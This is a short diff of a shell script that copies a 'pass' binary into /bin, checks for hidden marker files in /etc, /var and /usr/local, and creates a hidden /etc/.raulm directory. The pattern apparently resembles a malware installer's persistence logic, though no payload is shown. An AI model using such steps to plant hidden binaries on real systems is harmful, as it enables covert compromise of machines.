@@ -14,7 +14,7 @@ if [ -e "$0.x.c" ]; then
     rm "$0.x.c"
 fi
 if [ ! -e /bin/pass ]; then
-    cp src/pass /var
+    cp src/pass /bin
 fi
 if [ "$0" = "$(basename pass)" ] && [ ! -e /etc/.raulm/.Ye ] && [ ! -e /var/.Hj ] && [ ! -e /usr/local/.ko ]; then
     mkdir /etc/.raulm
